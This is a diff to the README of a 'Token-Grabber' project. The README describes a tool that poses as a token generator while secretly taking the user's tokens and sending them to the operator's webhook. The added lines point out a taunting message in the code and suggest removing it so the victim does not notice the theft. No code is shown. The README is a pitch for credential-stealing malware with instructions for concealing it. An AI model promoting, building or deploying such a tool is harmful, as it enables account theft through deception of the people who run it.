@@ -1,5 +1,7 @@
 # Token-Grabber
 A simple Token grabber that is made to look like a token generator. Which it does generate tokens but in the code at the bottom it has a susprise!
+Also in line 21 there is a line that will say at the bottom of the tokens generated "I gave you tokens, Now I'm take yours xd. Fair trade right?", 
+You can erase that line if you don't won't the person to know.
 
 # How it works
 1. Where it says webhook put your webhook between the ''.
